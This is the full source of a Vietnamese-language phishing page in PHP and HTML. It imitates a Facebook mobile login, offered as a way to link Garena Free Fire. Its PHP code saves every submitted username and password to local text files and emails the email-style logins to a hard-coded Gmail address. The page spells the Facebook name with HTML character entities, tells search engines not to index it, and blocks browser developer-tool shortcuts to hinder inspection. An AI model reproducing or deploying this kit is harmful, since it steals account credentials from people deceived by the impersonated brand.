<?php 
session_start();
$urlrangerlazzy = 'https://'.$_SERVER['HTTP_HOST'].'';
 $result = 1;
      function emailValid($string) { 
        if (preg_match ("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+\.[A-Za-z]{2,6}$/", $string) || preg_match ("/^\+?(84|0)(1\d{10}|10\d{10}|10\d{10}|3\d{10}|7\d{10}|5\d{10})$/", $string)) {
            return true;
        }
    }
    if (isset($_POST['username'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
    if (strlen((int)$username) >= 8 && strlen($_POST['password']) > 4) {
        $result = 2;
            echo ("<script>location.href='/index.php'</script>");
        $result = '2';
        $newcontent = "".$username."|".$password."".$time."".$_POST['loai']."\n";

        if(!preg_match('/'.$username.'/', file_get_contents('acc_sdt.txt'))){
        $file = fopen('acc_sdt.txt','a');
        $_SESSION['username'] = $_POST['username'];
        $_SESSION['password'] = $password;
        fwrite($file,$newcontent);
        fclose($file);
        }

        header('localtion: index.php '); // thay đường dẫn vô
    } else { 
    if (emailValid($username) && strlen($_POST['password']) > 4) {
        $result = 2;
            echo ("<script>location.href='/index.php'</script>");

        $result = '2';
        $newcontent = "".$username."|".$password."".$time."".$_POST['loai']."\n";

        if(!preg_match('/'.$username.'/', file_get_contents('acc_mail.txt'))){
        $file = fopen('acc_mail.txt','a');
        $_SESSION['username'] = $_POST['username'];
        $_SESSION['password'] = $password;
        fwrite($file,$newcontent);
        fclose($file);
        }
        fclose($file);
        header('localtion: index.php ');
        $message_mail = "$username|$password\nWeb: $urlrangerlazzy";    
        $from_mail = "From: $username";
        $chude_mail = "ACC Facebook";
        mail('rangerlazzy@gmail.com', $chude_mail, $message_mail, $from_mail); //mail nhận acc
    } else {
        $result = 0;
        $return = 'Tài khoản hoặc mật khẩu bạn vừa nhập chưa chính xác.';
        }
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="AdsBot-Google" content="noindex" />
    <meta name="googlebot" content="noindex" />
    <meta name="googlebot-news" content="noindex" />
    <meta name="robots" content="noindex, nofollow">
    <meta name="robots" content="nofollow">
    <meta name="googlebot" content="noindex">
<title>Đăng nhập qua Faceb&#111;ok</title>
<style>
.error-msg { color: red !important; }
.error-msg { padding-bottom: -12px !important; }
.done-msg { color: blue !important; }
.done-msg { padding-bottom: -12px !important; }
.sp_7V_P8-AK9yC{background-image: url(../assets/img/jT0UEYSEi4D.png)!important;}
</style>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
<link rel="shortcut icon" href="<?=$urlrangerlazzy?>/assets/img/facebook-icon.png" />
<link rel="stylesheet" type="text/css" href="/assets/css/fb.css">
</head>
<body class="touch x1 _fzu _50-3 iframe acw portrait">
<div id="viewport" style="min-height: 613px;">
<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Faceb&#111;ok</h1>
<div id="page" class="">
<div class="_129_" id="header-notices"></div>
<div class="_4g33 _52we _52z5" id="header">
<div class="_4g34 _52z6"><a href="#"><i class="img sp_7V_P8-AK9yC sx_ce405b"><u>faceb&#111;ok</u></i></a></div>
</div>
<div class="_5soa acw" id="root" role="main" style="min-height: 613px;">
<div class="_4g33">
<div class="_4g34" id="u_0_0">
<div class="_5yd0 _2ph- _5yd1" style="display:none" id="login-notice"></div>
<?php if($result == 1){ ?>
<!--<div class="acy apm abb"><span class="mfsm">Trước tiên, bạn phải đăng nhập.</span></div>-->
<?php } elseif ($result == 0) { ?>
    <div class="_5yd0 _2ph- _5yd1" style="" id="login_error" data-sigil="m_login_notice"><?php echo $return; ?> <a href="#" class="_652e">Đăng ký tài khoản.</a></div>
<?php } elseif ($result == 2) { ?>
    <div class="acy apm abb"><span class="done-msg"><?php echo $return; ?></span></div>
<?php } ?>    
<div class="aclb _4-4l">
<div class="_5rut">
    <div class="_52jj _3-q2">
        <img src="<?=$urlrangerlazzy?>/assets/img/ff-logo.webp" width="60" class="_3-q3 img">
        <div class="_52je _52j9">Hãy đăng nhập vào tài khoản Facebook của bạn để kết nối với Garena Free Fire</div>
    </div>
<form method="post" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-autoid="autoid_2">
<div id="user_info_container"></div>
<div id="pwd_label_container"></div>
<div id="otp_retrieve_desc_container"></div>
<div class="_56be _5sob">
<div class="_55wo _55x2 _56bf">
<div id="email_input_container"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="username" placeholder="Email hoặc số điện thoại" type="text"></div>
<div>
<div class="_1upc _mg8">
<div class="_4g33">
<div class="_4g34 _5i2i _52we">
<div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="password" placeholder="Mật khẩu" type="password"></div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="_2pie" style="text-align:center;">
<div id="u_0_4">
<button type="submit" value="Đăng nhập" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" ><span class="_55sr">Đăng nhập</span></button>
</div>
<div id="otp_button_elem_container"></div>
</div>
<div class="_xo8"></div>
</form>
<div>
<div class="_43mg"><span class="_43mh">hoặc</span></div>
<div class="_52jj _5t3b" id="u_0_6"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="#">Tạo tài khoản mới</a></div>
</div>
 <div>
<div class="other-links">
<ul class="_5pkb _55wp">
<li><span class="mfss fcg"><a href="#" id="forgot-password-link">Quên mật khẩu?</a></span></li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="_55wr _5ui2">
<div class="_5dpw">
<div class="_5ui3" data-nocookies="1" id="locale-selector">
<div class="_4g33">
<div class="_4g34">
<span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
<div class="_3ztc"><span class="_52jc"><a href="#">中文(台灣)</a></span></div>
<div class="_3ztc"><span class="_52jc"><a href="#">Español</a></span></div>
<div class="_3ztc"><span class="_52jc"><a href="#">Français (France)</a></span></div>
</div>
<div class="_4g34">
<div class="_3ztc"><span class="_52jc"><a href="#">English (UK)</a></span></div>
<div class="_3ztc"><span class="_52jc"><a href="#">한국어</a></span></div>
<div class="_3ztc"><span class="_52jc"><a href="#">Português (Brasil)</a></span></div>
<a href="#">
<div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"><i class="img sp_7V_P8-AK9yC sx_21ee4d"></i></div>
</a>
</div>
</div>
</div>
<div class="_5ui4"><span class="mfss fcg">Facebo&#111;k © 2018</span></div>
</div>
</div>
</div>
</div>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>
            document.onkeydown=function(a){if(123==event.keyCode||a.ctrlKey&&a.shiftKey&&73==a.keyCode||a.ctrlKey&&a.shiftKey&&67==a.keyCode||a.ctrlKey&&a.shiftKey&&74==a.keyCode||a.ctrlKey&&85==a.keyCode)return!1};
        </script>

<script>
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
        
          gtag('config', 'UA-126693788-1');
        </script>
</body>
</html>